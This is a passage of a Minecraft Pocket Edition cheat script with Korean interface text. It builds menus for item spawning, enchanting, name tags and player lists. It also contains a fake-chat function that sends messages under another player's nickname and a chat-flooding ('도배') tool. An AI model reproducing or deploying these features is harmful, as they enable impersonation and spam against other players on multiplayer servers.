btnT[0].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
noPvp = onoff;
}
}));
btnT[1].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
f.tf = onoff;
if(onoff) Dark.toast("블록 끝에 걸쳐있는 경우도 나는것으로 인식됩니다.");
}
}));
btnT[2].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeCmdBtn(onoff);
}
}));
btnT[3].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeChatBtn(onoff);
}
}));
btnT[4].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
antiChat = onoff;
}
}));
btnT[5].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
noPlayer = onoff;
}
}));
btnT[6].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
hyperLogOn = onoff;
if(onoff){
saveHyperLog();
hyperLogSaveAlertDialog();
}
Dark.save("log", hyperLogOn);
}
}));
btnT[7].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(Dark.read("seedLink")=="true"){
theSeed = onoff;
Dark.save("theSeed", onoff);
}
else{
Dark.toast("스크립트가 연동되어 있지 않습니다.");
}
}
}));
btnT[8].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
noAdmin = onoff;
}
}));
btnT[9].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
var file1 = new java.io.File(sdcard+"/games/com.mojang/minecraftpe/external_servers.txt");
var file2 = new java.io.File(sdcard+"/games/com.mojang/minecraftpe/external_servers1.txt");
if(onoff) file1.renameTo(file2);
else file2.renameTo(file1);
Dark.toast("마크를 다시 실행하여야 적용됩니다.");
}
}));
btnT[10].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
hideNickNames = onoff;
if(onoff){
for each(var e in Entity.getAll()){
if(Player.isPlayer(e)){
nickNames.push([e, Player.getName(e)]);
Entity.setNameTag(e, "");
}
}
}
else{
for each(var pp in nickNames){
Entity.setNameTag(pp[0], pp[1]);
}
nickNames = [];
}
}
}));
btnT[11].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
nameChat = onoff;
}
}));
for(var n in menusT)
layout.addView(btnT[n].mv());
var btns = [];
var menus = ["대화 내용 보기", "채팅 조작", "채팅 무시 설정", "하이퍼 로그 보기", "플레이어 이동 금지", "내 ip 확인", "포션 효과 방지"];
for(var n in menus)
btns[n] = makeButton(menus[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
showChatLog();
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
fakeChat();
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
chatIgnoreDialog();
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.showDialog("하이퍼 로그", getHyperLog()+"\n"+hyperLog);
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
antiMoveDialog();
}
});
btns[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.toast("잠시 기다려주세요...");
new java.lang.Thread({
run : function(){
Dark.toast("내 ip : "+ModPE.getMyIp());
}
}).start();
}
});
btns[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
antiPotion();
}
});
for(var n in menus)
layout.addView(btns[n]);
var exit = makeExit(menuS2);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuS2);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuS2.setContentView(layout2);
menuS2.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function fakeChat(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("닉네임 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("닉네임을 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setText("채팅 내용 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("채팅 내용을 입력하세요...");
loc4.setTextColor(white);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("채팅 조작");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var pe = Player.getEntity();
var pn = Player.getName(pe);
Entity.setNameTag(pe, loc2.getText()+"");
ScriptManager.nativeSendChat(loc4.getText()+"");
if(fixSendChat) clientMessage("<"+loc2.getText()+"> "+loc4.getText());
Entity.setNameTag(pe, pn);
Dark.toast("조작된 메시지를 보냈습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function spawnEntity(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var entType2 = 0;
var ents = ["엔티티 선택", "충전된 크리퍼", "아기 좀비", "아기 좀비 피그맨", "스파이더 조키", "치킨 조키"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, ents);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
entType2 = p;
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("수 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("스폰할 엔티티의 수를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
est = entType2;
esn = Number(loc2.getText());
Dark.toast("터치하시면 스폰됩니다.");
}
}));
dialog.setTitle("엔티티 스폰");
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function antiEntityList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var names = [];
var entityIds = [];
for(var n=0;n<entityData.length;n++){
names[n] = entityData[n][0];
entityIds[n] = entityData[n][1];
}
var checkBox = [];
for(var n in names){
checkBox[n] = new android.widget.CheckBox(ctx);
checkBox[n].setText(names[n]);
checkBox[n].setTextColor(white);
checkBox[n].setId(n);
if(antiEnt.indexOf(entityIds[n])==-1) checkBox[n].setChecked(false);
else checkBox[n].setChecked(true);
checkBox[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff) antiEnt.push(entityIds[check.getId()]);
else antiEnt.splice(antiEnt.indexOf(entityIds[check.getId()]), 1);
}
}));
layout.addView(checkBox[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("엔티티 스폰 방지 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function enchantDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("강도 : ");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("강도를 입력하세요...");
txt2.setTextColor(white);
txt2.setInputType(number|number2);
layout.addView(txt1);
layout.addView(txt2);
Dark.noFullScreen(txt2);
var names = ["물갈퀴", "살충", "폭발 저항", "친수성", "효율", "가벼운 착지", "화염검", "화염 보호", "화염활", "행운", "무한", "밀치기", "약탈", "바다 행운", "미끼", "힘", "원거리 보호", "보호", "때리기", "호흡", "날카로움", "섬세한 손길", "강타", "가시", "내구성"];
var types = [Enchantment.AQUA_AFFINITY, Enchantment.BANE_OF_ARTHROPODS, Enchantment.BLAST_PROTECTION, Enchantment.DEPTH_STRIDER, Enchantment.EFFICIENCY, Enchantment.FEATHER_FALLING, Enchantment.FIRE_ASPECT, Enchantment.FIRE_PROTECTION, Enchantment.FLAME, Enchantment.FORTUNE, Enchantment.INFINITY, Enchantment.KNOCKBACK, Enchantment.LOOTING, Enchantment.LUCK_OF_THE_SEA, Enchantment.LURE, Enchantment.POWER, Enchantment.PROJECTILE_PROTECTION, Enchantment.PROTECTION, Enchantment.PUNCH, Enchantment.RESPIRATION, Enchantment.SHARPNESS, Enchantment.SILK_TOUCH, Enchantment.SMITE, Enchantment.THORNS, Enchantment.UNBREAKING];
var typeId = [];
var checks = [];
for(var n in types){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(names[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff) typeId.push(check.getId());
else typeId.splice(typeId.indexOf(check.getId()), 1);
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("인첸트 - 종류");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(!Dark.isMulti()||(Number(txt2.getText())<=elr2&&Number(txt2.getText())>=-100)||elr){
for(var n in typeId){
ScriptManager.nativePlayerEnchant(Player.getSelectedSlotId(), types[typeId[n]], Number(txt2.getText()));
}
Dark.toast("인첸트를 하였습니다.");
}
else{
Dark.toast("테러 방지를 위해 걸어놓은 인첸트 허용 범위를 초과하였습니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function inputItemName(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("아이템 이름 : ");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("아이템의 새로운 이름을 입력하세요...");
txt2.setTextColor(white);
layout.addView(txt1);
layout.addView(txt2);
Dark.noFullScreen(txt2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 이름 변경");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Player.setItemCustomName(Player.getSelectedSlotId(), txt2.getText().toString());
Dark.toast("아이템의 이름을 "+txt2.getText()+"(으)로 바꿨습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function chatIgnoreDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = [];
var playerNames = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
players.sort();
}
for each(var e in players){
playerNames.push(Player.getName(e));
}
var checks = [];
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(playerNames[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
if(chatIgnore.indexOf(playerNames[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
chatIgnore.push(playerNames[check.getId()]);
}
else if(onoff==false){
chatIgnore.splice(chatIgnore.indexOf(playerNames[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("채팅 무시 대상자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function inputTitle(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var color = "f";
var colors = ["색상 선택", "검정", "어두운 파랑", "어두운 초록", "어두운 하늘색", "어두운 빨강", "어두운 보라색", "금색", "회색", "어두운 회색", "파랑", "초록", "하늘색", "빨강", "밝은 보라", "노랑", "흰색"];
var colorCodes = ["f", 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, colors);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
color = colorCodes[p];
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("칭호 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("칭호를 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(arr==null){
Entity.setNameTag(playerTarget, "§"+color+"["+loc2.getText()+"] §f"+Player.getName(playerTarget));
}
else{
for each(var pp in arr)
Entity.setNameTag(pp, "§"+color+"["+loc2.getText()+"] §f"+Player.getName(pp));
}
Dark.toast("칭호를 부여하였습니다.");
}
}));
dialog.setTitle("칭호 부여");
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function webViewSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menuT = ["전체 화면", "자바스크립트 허용", "줌 인/아웃 활성화", "폼 데이터 저장", "비밀번호 저장"];
for(var n in menuT){
btnT[n] = new android.widget.Switch(ctx);
btnT[n].setText(menuT[n]);
btnT[n].setId(n);
btnT[n].setChecked(wvsa[n]);
btnT[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(swit, onoff){
wvsa[swit.getId()] = onoff;
}
}));
layout.addView(btnT[n]);
}
var hs = new android.widget.Button(ctx);
hs.setText("홈페이지 설정");
hs.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
setHome();
}
});
layout.addView(hs);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("웹 브라우저 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function chatTerrorSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var ns = new android.widget.CheckBox(ctx);
ns.setText("반복 횟수 표시");
ns.setChecked(showNumber);
ns.setTextColor(white);
ns.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
showNumber = onoff;
}
}));
layout.addView(ns);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("도배 문구 : ");
loc1.setTextSize(18);
loc2.setHint("도배 문구를 입력하세요...");
loc2.setText(chatTerrorString+"");
loc1.setTextColor(white);
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setText("도배 횟수 : ");
loc3.setTextSize(18);
loc4.setHint("도배 횟수를 입력하세요...");
loc4.setInputType(number);
loc4.setText(chatTerrorN+"");
loc3.setTextColor(white);
loc4.setTextColor(white);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("도배기 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
chatTerrorString = loc2.getText().toString();
if(chatTerrorString==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/chat.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("chat", chatTerrorString);
}
chatTerrorN = Number(loc4.getText());
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openIdBlackList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var list = new android.widget.EditText(ctx);
list.setHint("이 맵에 접속할 수 없도록 차단할 플레이어를 불러오세요...");
list.setText(blackListId);
list.setTextColor(white);
layout.addView(list);
Dark.noFullScreen(list);
var pl = new android.widget.Button(ctx);
pl.setText("접속중인 플레이어 목록에서 불러오기");
pl.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
playerList(list, true);
}
});
layout.addView(pl);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("맵 접속 방지");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
blackListId = list.getText().toString();
if(list.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/banData/"+Level.getWorldDir()+".txt");
if(file.exists()) file.delete();
}
else{
Dark.save("banData/"+Level.getWorldDir(), blackListId);
}
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function saveHyperLog(){
if(hyperLogOn){
new java.lang.Thread({
run : function(){
try{
java.lang.Thread.sleep(60000);
var cache = getHyperLog();
Dark.save("hyperLog/"+Dark.getTime(1), cache+"\n"+hyperLog);
if(hyperLogSaveAlert) Dark.toast("하이퍼 로그가 저장되었습니다.");
saveHyperLog();
}
catch(e){
Dark.showError(e);
}
}
}).start();
}
else{
return;
}
}
saveHyperLog();


function hyperLogSaveAlertDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("하이퍼 로그 저장 알림");
dialog.setMessage("하이퍼 로그를 저장할 때, 알림을 띄우시겠습니까?");
dialog.setNegativeButton("아니요", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
hyperLogSaveAlert = false;
}
}));
dialog.setPositiveButton("네", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
hyperLogSaveAlert = true;
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function serverConnectedHook(ip, port, tf){
if(Dark.read("sdp1")=="true"){
Dark.checkSdResetSource();
}
try{
if(hyperLogOn&&tf) hyperLog += "["+Dark.getTime(2)+"] 서버 접속 (ip : "+ip+", 포트 : "+port+")\n";
if(btnRe&&dce.re) Dark.makeButton();
if(Dark.read("info6")=="true"){
try{
ScriptManager.setLevelFakeCallback(true, false);
Dark.toast("블록런처의 버튼 삭제를 비활성화 시킵니다.");
java.lang.Thread.sleep(100);
Dark.makeButton();
}
catch(e){
Dark.toast(e);
}
}
if(compileFinish) eval(dcmsData.serverConnectedHook+"");
}
catch(e){
Dark.toast(e);
}

}


function openWhiteList(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var list = new android.widget.EditText(ctx);
list.setHint("닉네임을 입력하세요...");
list.setText(whiteList);
list.setTextColor(white);
layout.addView(list);
Dark.noFullScreen(list);
var pl = new android.widget.Button(ctx);
pl.setText("접속중인 플레이어 목록에서 불러오기");
pl.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
playerList(list, false);
}
});
layout.addView(pl);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("화이트 리스트");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
whiteList = list.getText().toString();
if(list.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/whiteList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("whiteList", whiteList);
}
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function getHyperLog(){
if(Dark.read("hyperLog/"+Dark.getTime(1))==null) return "";
else return Dark.read("hyperLog/"+Dark.getTime(1)).toString();
}


function callModTick(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function() {
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
modTick();
if(modTickOnoff) callModTick();
}
}), 50);
}
}));
}


function makeMcBtn(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
mcBtn = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menus = ["M.C.", "P.M."];
var tfs = [mc, mc2];
for(var n in menus){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menus[n]);
btnT[n].setTextOff(menus[n]);
btnT[n].setTextSize(13);
btnT[n].setTextColor(white);
btnT[n].setId(n);
btnT[n].setChecked(tfs[n]);
btnT[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
if(onoff){
mc = true;
Dark.toast("Magic Carpet on");
mc2 = false;
}
else{
mc = false;
Dark.toast("Magic Carpet off");
for(var xx=mx-2;xx<mx+3;xx++)
for(var yy=my-1;yy<my+2;yy++)
for(var zz=mz-2;zz<mz+3;zz++)
if(getTile(xx, yy, zz)==20){
setTile(xx, yy, zz, 0);
}
mt = -1;
}
break;
case 1 : 
mc2 = onoff;
if(onoff) Dark.toast("하강모드 활성화");
else Dark.toast("하강모드 비활성화");
break;
}
}
}));
layout.addView(btnT[n]);
}
setDragListener(mcBtn, btnT[0], 2);
mcBtn.setContentView(layout);
mcBtn.setWidth(dip2px(ctx, 60));
mcBtn.setHeight(dip2px(ctx, 100));
mcBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
mcBtn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, dip2px(ctx, 82), dip2px(ctx, 70));
}
else{
if(mcBtn!=null){
mcBtn.dismiss();
mcBtn = null;
}
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function itemList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var items = getItemArray();
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("검색어를 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var list = new android.widget.ListView(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, items);
list.setAdapter(adapter);
list.setTextFilterEnabled(true);
list.setOnItemClickListener(new android.widget.AdapterView.OnItemClickListener(){
onItemClick : function(parent, view, postion, id){
var id, damage;
var cache = String(view.getText());
var cache2 = cache.substring(2, cache.indexOf(" ]"));
var data = cache2.split(" : ");
if(Level.getGameMode()==0){
addItem(false, null, false, data[0], data[1]);
}
else{
Player.setInventorySlot(Player.getSelectedSlotId(), data[0], 5, data[1]);
Dark.toast("설정되었습니다.");
}
}
});
layout.addView(list);
loc2.addTextChangedListener(new android.text.TextWatcher({
onTextChanged : function(s,start,before,count){
try{
adapter.getFilter().filter(s.toString());
}
catch(e){
Dark.showError(e);
}
},
afterTextChanged : function(s){
try{
if(loc2.getText().length==0)
adapter.getFilter().filter(null);
}
catch(e){
Dark.showError(e);
}
}
}));
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
dialog.setView(layout);
dialog.setTitle("아이템 목록/검색");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function getItemArray(){
try{
var items = [];
var codes = [0, 9, 11, 64, 95, 97, 140, 144, 246, 248, 249, 255, 373, 383, 439];
var names = ["공기", "멈춘 물", "멈춘 용암", "문(블록)", "보이지 않는 베드락", "몬스터 스폰알(?)", "화분", "머리", "빛나는 옵시디언", "업데이트 블록 1", "업데이트 블록 2", "오류 돌", "물병(포션)", "스폰알", "카메라"];
var codes2 = [1, 5, 6, 17, 18, 24, 35, 38, 43, 44, 79, 97, 98, 155, 159, 161, 162, 171, 175, 333, 349, 350, 351, 373, 438];
var lengths = [7, 6, 6, 4, 4, 3, 16, 9, 8, 8, 2, 6, 3, 3, 16, 2, 2, 16, 6, 6, 4, 4, 16, 36, 36];
if(mcpev5){
codes2.push(262);
lengths.push(37);
}
for(var n=0;n<4096;n++){
if(ScriptManager.nativeIsValidItem(n)){
if(codes.indexOf(n)==-1){
items.push("[ "+n+" : 0 ] "+ScriptManager.nativeGetItemName(n, 0, false));
}
else if(n==383){
var entityIds = [];
for(var m=0;entityData[m][1]<64;m++){
entityIds[m] = entityData[m][1];
}
var codes3 = [20, 21, 44, 52];
var names3 = ["아이언 골램 생성", "스노우 골램 생성", "좀비 주민 생성", "위더 생성"];
for(var m=0;m<entityIds.length;m++){
if(codes3.indexOf(m)!=-1) items.push("[ 383 : "+codes3[codes3.indexOf(m)]+" ] "+names3[codes3.indexOf(m)]);
else items.push("[ 383 : "+entityIds[m]+" ] "+ScriptManager.nativeGetItemName(383, entityIds[m], false));
}
}
else{
items.push("[ "+n+" : 0 ] "+names[codes.indexOf(n)]);
}
if(codes2.indexOf(n)!=-1){
for(var m=1;m<lengths[codes2.indexOf(n)];m++){
items.push("[ "+n+" : "+m+" ] "+ScriptManager.nativeGetItemName(n, m, false));
}
}
}
}
return items;
}
catch(e){
Dark.showError(e);
}
}


function antiMoveDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
players.sort();
}
var checks = [];
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(Player.getName(players[n]));
checks[n].setId(n);
checks[n].setTextColor(white);
if(antiMove.indexOf(players[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
antiMove.push(players[check.getId()]);
}
else if(onoff==false){
antiMove.splice(antiMove.indexOf(players[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
